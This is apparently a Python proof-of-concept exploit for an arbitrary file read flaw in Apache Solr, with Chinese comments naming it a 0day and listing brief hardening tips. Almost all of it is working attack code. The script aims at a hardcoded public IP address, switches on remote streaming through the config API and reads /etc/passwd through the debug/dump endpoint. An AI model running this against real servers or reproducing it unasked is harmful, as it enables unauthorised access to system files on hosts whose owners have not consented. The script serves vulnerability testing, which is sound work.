#!/usr/bin/python
# coding: UTF-8
# 漏洞标题：Solr最新版任意文件读取0day
# 文章参考：https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ
# 漏洞周期，0day, 官网不修复，
# 加固方式：加强权限控制，设置强密码，禁止外网访问

import requests
import json

host = "http://132.148.152.112:8983/"
if host[-1]=='/':
    host=host[:-1]
def get_core(host):
    url=host+'/solr/admin/cores?indexInfo=false&wt=json'
    core_data=requests.get(url,timeout=3).json()

    if core_data['status']:
        core=core_data['status'].keys()[0]
        # print(core)
        jsonp_data={"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":'true'}}
        requests.post(url=host+"/solr/%s/config"%core,json=jsonp_data)

        result_text=requests.post(url=host+'/solr/%s/debug/dump?param=ContentStreams' % core, data={"stream.url":"file:///etc/passwd"})
        result_text = result_text.content

        if "root:x:0:0:root:/root:/bin/bash" in result_text:
            print (host+" 存在此漏洞")
            print (result_text)
    else:
        exit("不存在此漏洞")
get_core(host)
